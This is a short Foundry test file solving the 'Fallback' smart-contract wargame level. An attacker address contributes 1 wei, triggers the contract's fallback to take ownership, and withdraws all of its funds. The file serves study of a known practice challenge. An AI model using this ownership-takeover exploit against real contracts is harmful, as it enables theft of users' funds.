// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/01_Fallback.sol";

contract FallbackTest is Test {
    Fallback fallbackContract; // fallback is reserved in solidity
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = address(address(uint160(uint256(keccak256(abi.encodePacked("Attacker"))))));

        vm.deal(attacker, 2 wei); // Fund attacker

        fallbackContract = new Fallback();

    }

    function testSolution() public {
        vm.startPrank(attacker);
        
        fallbackContract.contribute{value:1 wei}();

        address(fallbackContract).call{value:1 wei}("");

        fallbackContract.withdraw();

        vm.stopPrank();

        assertEq(fallbackContract.owner(), attacker, "Attacker is not the owner!");
        assertEq(address(fallbackContract).balance, 0, "Fallback contract still has funds!");
    }
}
